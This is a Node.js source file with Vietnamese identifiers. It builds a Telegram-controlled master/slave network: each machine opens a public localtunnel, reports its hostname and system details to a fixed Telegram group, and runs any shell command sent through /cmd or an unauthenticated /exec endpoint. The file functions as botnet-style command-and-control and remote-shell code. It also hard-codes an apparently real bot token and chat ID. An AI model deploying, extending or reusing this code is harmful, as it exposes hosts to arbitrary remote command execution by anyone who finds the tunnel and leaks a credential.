const express=require('express'),TelegramBot=require('node-telegram-bot-api'),localtunnel=require('localtunnel'),{exec}=require('child_process'),https=require('https'),os=require('os');
const TOKEN='7898378784:AAH7RAql823WY3nE25ph28kyO2N20Rhqbts',ID_NHOM='7371969470',CONG=Math.floor(Math.random()*2000)+8000,TEN_MAY=os.hostname(),LA_MASTER=process.env.MASTER==='true',URL_MASTER=process.env.MASTER_URL;
const app=express();app.use(express.json());const bot=new TelegramBot(TOKEN,{polling:false});
let danhSachSlave=[],thoiDiemBatDau=Math.floor(Date.now()/1000);

const chayNeofetch=(callback)=>{exec('[ -f neofetch/neofetch ] && ./neofetch/neofetch --stdout || (git clone https://github.com/dylanaraps/neofetch && ./neofetch/neofetch --stdout)',(_,ketQua)=>callback((ketQua||'').trim()));};
const layThoiGianHoatDong=(duLieu)=>duLieu.match(/Uptime:\s*(.+)/)?.[1]||doiGiaySangGioPhut(os.uptime());
const doiGiaySangGioPhut=(giay)=>`${Math.floor(giay/3600)}h ${Math.floor((giay%3600)/60)}m`;
const thongBaoMatKetNoi=(url)=>{const slave=danhSachSlave.find(s=>s.url===url);if(slave)bot.sendMessage(ID_NHOM,`⚠️ *Slave ${slave.stt} ${slave.tenMay} mất kết nối!*`,{parse_mode:'Markdown'});danhSachSlave=danhSachSlave.filter(s=>s.url!==url);};
setInterval(()=>{const bayGio=Date.now();danhSachSlave.forEach(s=>{if(bayGio-s.lanCuoiPing>10000)thongBaoMatKetNoi(s.url);});},2000);

app.post(`/bot${TOKEN}`,(req,res)=>{
  const tinNhan=req.body?.message;if(!tinNhan?.text||tinNhan.date<thoiDiemBatDau)return res.sendStatus(200);
  const noiDung=tinNhan.text.trim();
  if(noiDung==='/help'){bot.sendMessage(tinNhan.chat.id,'/status - Kiểm tra bot\n/cmd <lệnh> - Chạy lệnh\n/help - Trợ giúp',{parse_mode:'Markdown'});return res.sendStatus(200);}
  if(noiDung==='/status'){
    Promise.all([new Promise(resolve=>chayNeofetch(ketQua=>resolve({loai:'master',ten:TEN_MAY,thoigian:layThoiGianHoatDong(ketQua)}))),...danhSachSlave.map((s,i)=>Promise.resolve({loai:'slave',ten:`${s.tenMay} (${i+1})`,thoigian:s.thoigianHoatDong}))]).then(tatCa=>{let ketQua=`🟢 *Bots online (${tatCa.length}):*\n`;tatCa.forEach(b=>ketQua+=`${b.loai==='master'?'👑 *Master*':'🤖 *Slave*'}: ${b.ten} (Hoạt động: ${b.thoigian})\n`);bot.sendMessage(tinNhan.chat.id,ketQua,{parse_mode:'Markdown'});res.sendStatus(200);});
    return;
  }
  if(noiDung.startsWith('/cmd')){
    const lenh=noiDung.slice(4).trim();if(!lenh){bot.sendMessage(tinNhan.chat.id,'⚠️ *Nhập lệnh sau /cmd*',{parse_mode:'Markdown'});return res.sendStatus(200);}
    if(LA_MASTER){
      if(!danhSachSlave.length){bot.sendMessage(tinNhan.chat.id,'⚠️ *Không có slave nào online.*',{parse_mode:'Markdown'});return res.sendStatus(200);}
      danhSachSlave.forEach(({url,tenMay},i)=>{
        const guiLenh=https.request({hostname:new URL(url).hostname,path:'/exec',method:'POST',headers:{'Content-Type':'application/json'}},phanHoi=>{let duLieu='';phanHoi.on('data',chunk=>duLieu+=chunk);phanHoi.on('end',()=>bot.sendMessage(tinNhan.chat.id,`💻 *Slave ${i+1} ${tenMay}:*\n\`\`\`\n${duLieu.trim()}\n\`\`\``,{parse_mode:'Markdown'}));});
        guiLenh.on('error',loi=>bot.sendMessage(tinNhan.chat.id,`❌ *Slave ${i+1} ${tenMay} lỗi:* ${loi.message}`,{parse_mode:'Markdown'}));guiLenh.write(JSON.stringify({cmd:lenh}));guiLenh.end();
      });
    }else exec(lenh,(loi,ketQua,loiChu)=>bot.sendMessage(tinNhan.chat.id,`💻 *Slave ${TEN_MAY}:*\n\`\`\`\n${(ketQua||loiChu||loi?.message||'Không có output').trim()}\n\`\`\``,{parse_mode:'Markdown'}));
    return res.sendStatus(200);
  }
  res.sendStatus(200);
});

app.post('/exec',(req,res)=>{exec(req.body?.cmd||'',(loi,ketQua,loiChu)=>{res.send((ketQua||loiChu||loi?.message||'Không có kết quả').trim());});});
app.post('/register',(req,res)=>{const{port,url,hostname,uptime,report}=req.body||{};if(!port||!url||!hostname)return res.sendStatus(400);const bayGio=Date.now();const slaveTonTai=danhSachSlave.findIndex(s=>s.url===url);const stt=slaveTonTai>=0?danhSachSlave[slaveTonTai].stt:danhSachSlave.length+1;if(slaveTonTai>=0)danhSachSlave[slaveTonTai]={port,url,tenMay:hostname,thoigianHoatDong:uptime,lanCuoiPing:bayGio,stt};else danhSachSlave.push({port,url,tenMay:hostname,thoigianHoatDong:uptime,lanCuoiPing:bayGio,stt});bot.sendMessage(ID_NHOM,`📩 *Slave ${stt} đăng ký:*\n*Tên máy:* ${hostname}\n*Thời gian:* ${uptime}\n*URL:* ${url}\n\n\`\`\`\n${report||''}\n\`\`\``,{parse_mode:'Markdown'});res.sendStatus(200);});
app.post('/ping',(req,res)=>{const{url}=req.body;const slave=danhSachSlave.find(s=>s.url===url);if(slave)slave.lanCuoiPing=Date.now();res.sendStatus(200);});

app.listen(CONG,async()=>{
  const tunnel=await localtunnel({port:CONG});const urlTunnel=tunnel.url;
  console.log(`🚀 Cổng ${CONG}`);console.log(`🌍 URL ${urlTunnel}`);
  chayNeofetch(ketQua=>{
    const thoigianHoatDong=layThoiGianHoatDong(ketQua);
    if(LA_MASTER){
      bot.setWebHook(`${urlTunnel}/bot${TOKEN}`);
      bot.sendMessage(ID_NHOM,`👑 *Master khởi động*\n*Máy chủ:* ${TEN_MAY}\n*Thời gian:* ${thoigianHoatDong}\n*URL:* ${urlTunnel}\n*Cổng:* ${CONG}\n\n\`\`\`\n${ketQua}\n\`\`\``,{parse_mode:'Markdown'});
      bot.sendMessage(ID_NHOM,`💡 *Chạy slave:*\n\`\`\`\nMASTER_URL=${urlTunnel} node bot.js\n\`\`\``,{parse_mode:'Markdown'});
    }else if(URL_MASTER){
      const dangKy=()=>{const req=https.request({hostname:new URL(URL_MASTER).hostname,path:'/register',method:'POST',headers:{'Content-Type':'application/json'}});req.on('error',()=>{});req.write(JSON.stringify({port:CONG,url:urlTunnel,hostname:TEN_MAY,uptime:thoigianHoatDong,report:ketQua}));req.end();};
      dangKy();setInterval(()=>{const guiPing=https.request({hostname:new URL(URL_MASTER).hostname,path:'/ping',method:'POST',headers:{'Content-Type':'application/json'}});guiPing.on('error',()=>{});guiPing.write(JSON.stringify({url:urlTunnel}));guiPing.end();},3000);
    }
  });
});
